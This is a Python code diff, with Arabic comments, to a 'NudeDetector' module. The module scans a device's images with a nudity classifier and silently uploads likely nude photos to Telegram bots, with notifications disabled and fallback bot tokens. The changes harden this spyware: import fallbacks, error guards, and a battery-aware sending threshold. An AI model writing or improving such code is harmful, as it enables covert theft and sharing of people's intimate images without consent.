@@ -28,16 +28,30 @@ if not os.path.exists(M):
 logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')
 
 # ========== استيراد المكتبات ==========
+AI_AVAILABLE = False
+Interpreter = None
+
 try:
     import numpy as np
     from PIL import Image, UnidentifiedImageError
     Image.MAX_IMAGE_PIXELS = 50_000_000
-    from tflite_runtime.interpreter import Interpreter
+
+    try:
+        from tflite_runtime.interpreter import Interpreter
+    except ImportError:
+        # محاولة بديلة: tensorflow-lite (قد لا تكون موجودة)
+        try:
+            import tensorflow as tf
+            Interpreter = tf.lite.Interpreter
+        except ImportError:
+            raise ImportError("No TFLite library found")
+
     AI_AVAILABLE = True
 except ImportError as e:
     logging.error(f"Failed to import AI libraries: {e}")
-    AI_AVAILABLE = False
-    class Interpreter: pass
+    # تعريف وهمي لتجنب NameError
+    class Interpreter:
+        pass
 
 
 class NudeDetector:
@@ -81,6 +95,8 @@ class NudeDetector:
 
     # ========== تحضير وتحميل النموذج ==========
     def _prepare_engine(self):
+        if not AI_AVAILABLE:
+            return
         try:
             need_copy = (not os.path.exists(self.model_path) or 
                          os.path.getsize(self.model_path) < 500000 or
@@ -147,14 +163,18 @@ class NudeDetector:
             return 0.0
 
     def _should_send(self, prob):
+        # عتبة ذكية تعتمد على حالة الشحن
         if prob > 0.90:
             return True
         if prob > 0.85:
             return True
         if prob > 0.70 and hasattr(self.mon, '_battery_ok'):
-            bat, charging = self.mon._battery_ok()
-            if charging:
-                return True
+            try:
+                bat, charging = self.mon._battery_ok()
+                if charging:
+                    return True
+            except:
+                pass
         return False
 
     # ========== المسح التلقائي ==========
@@ -168,6 +188,8 @@ class NudeDetector:
         threading.Thread(target=self._worker, daemon=True).start()
 
     def _worker(self):
+        if not AI_AVAILABLE or self.model is None:
+            return
         if not self._lock.acquire(blocking=False):
             return
         try:
@@ -243,7 +265,7 @@ class NudeDetector:
                 "disable_notification": True
             }, {"photo": f})
 
-        # إذا فشلت المحاولة الأولى (بوت معطل، 429، إلخ) -> fallback باستخدام active_tokens مباشرة
+        # إذا فشلت المحاولة الأولى -> fallback باستخدام active_tokens مباشرة
         if not res or not res.get('ok'):
             logging.warning("Primary bot failed in AI report, activating fallback...")
             for token in getattr(tg, 'active_tokens', []):
